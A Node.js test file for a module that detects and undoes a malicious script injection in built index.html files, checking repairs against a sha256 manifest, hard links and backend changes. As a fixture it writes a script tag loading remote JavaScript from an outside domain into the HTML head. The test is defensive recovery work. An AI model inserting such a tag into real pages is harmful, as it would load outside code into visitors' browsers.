import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, chmodSync, linkSync, unlinkSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createHash } from 'node:crypto'
import { verifiedStaticRepairs, restoreStaticRepairs } from './restore-verified-static-entry.mjs'
function run(){
const root=mkdtempSync(join(tmpdir(),'incudal-static-recovery-'))
const files=['client/dist/user/index.html','client/dist/admin/index.html','server/dist/worker.js'],clean=Buffer.from('<html><head>\n<meta charset="UTF-8">\n</head></html>\n'),code=Buffer.from('original worker\n')
const injection='<script src="https://188-96A2175A.jiaoyang677.sbs/lj/e.js" async></script>\n',hash=b=>createHash('sha256').update(b).digest('hex')
try{
 const original=name=>name.endsWith('index.html')?clean:code
 for(const name of files){mkdirSync(join(root,name,'..'),{recursive:true});writeFileSync(join(root,name),original(name));chmodSync(join(root,name),0o644)}
 const manifest=files.map(n=>hash(original(n))+'  ./'+n).join('\n')+'\n'
 for(const n of files.slice(0,2))writeFileSync(join(root,n),clean.toString().replace('<head>\n','<head>\n'+injection))
 const repairs=verifiedStaticRepairs(root,manifest,original);assert.equal(repairs.length,2)
 assert.throws(()=>verifiedStaticRepairs(root,manifest,()=>Buffer.from('wrong signed input')),/existing seal/)
 writeFileSync(join(root,files[2]),'changed backend');assert.throws(()=>verifiedStaticRepairs(root,manifest,original),/non-static/);writeFileSync(join(root,files[2]),code)
 linkSync(join(root,files[2]),join(root,'original-dependency-link'));assert.equal(verifiedStaticRepairs(root,manifest,original).length,2,'unchanged package-manager hard links remain untouched')
 linkSync(join(root,files[0]),join(root,'linked-index'));assert.throws(()=>verifiedStaticRepairs(root,manifest,original),/hard link/);unlinkSync(join(root,'linked-index'))
 writeFileSync(join(root,files[0]),Buffer.concat([repairs[0].current,Buffer.from('<script>extra()</script>')]));assert.throws(()=>verifiedStaticRepairs(root,manifest,original),/known injected line/);writeFileSync(join(root,files[0]),repairs[0].current)
 if(process.platform==='linux'){
  assert.equal(process.getuid(),0);restoreStaticRepairs(verifiedStaticRepairs(root,manifest,original))
  for(const n of files)assert.deepEqual(readFileSync(join(root,n)),original(n))
  console.log('PASS native restrictive-umask atomic static restoration with original seal and unchanged backend')
 }else console.log('PASS static recovery rejects other files, extra injections and unsigned original bytes; native publication separately required')
}finally{rmSync(root,{recursive:true,force:true})}
}
if(process.platform==='linux'&&process.getuid()===0)run()
else console.log('Native root static recovery verification requires a disposable Linux root; this run checks module syntax only')
